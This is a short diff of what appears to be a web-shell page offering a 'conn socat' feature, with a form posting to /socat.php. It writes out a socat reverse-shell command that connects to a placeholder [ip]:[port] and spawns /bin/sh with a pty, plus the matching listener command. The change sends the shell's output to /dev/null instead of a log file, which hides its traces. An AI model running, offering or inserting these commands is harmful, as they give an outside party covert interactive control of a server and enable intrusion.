@@ -16,7 +16,7 @@
 
 conn socat:<br>
 <pre>
-env TERM=linux bash/socat tcp-connect:[ip]:[port] exec:/bin/sh,pty,stderr,setsid,sigint,sane >log.txt 2>&1 &
+env TERM=linux bash/socat tcp-connect:[ip]:[port] exec:/bin/sh,pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &
 socat file:`tty`,raw,echo=0 tcp-listen:[port]
 </pre>
 <form action="/socat.php">
